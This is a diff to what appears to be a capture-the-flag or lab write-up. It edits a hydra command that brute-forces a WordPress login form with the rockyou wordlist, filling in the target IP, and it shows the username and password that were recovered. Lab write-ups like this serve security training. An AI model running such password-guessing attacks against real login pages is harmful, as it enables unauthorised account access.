@@ -26,7 +26,7 @@ Brute-forced WordPress login with hydra
 
   ```bash
 
-hydra -l elliot -P rockyou.txt 10.129.xx.xx http-form-post "/wp-login.php:user=^USER^&pass=^PASS^&wp-submit=Log In:F=incorrect"
+hydra -l elliot -P rockyou.txt 10.129.1.17 http-form-post "/wp-login.php:user=^USER^&pass=^PASS^&wp-submit=Log In:F=incorrect"
   ```
 Username: elliot, Password: ER28–0652
 
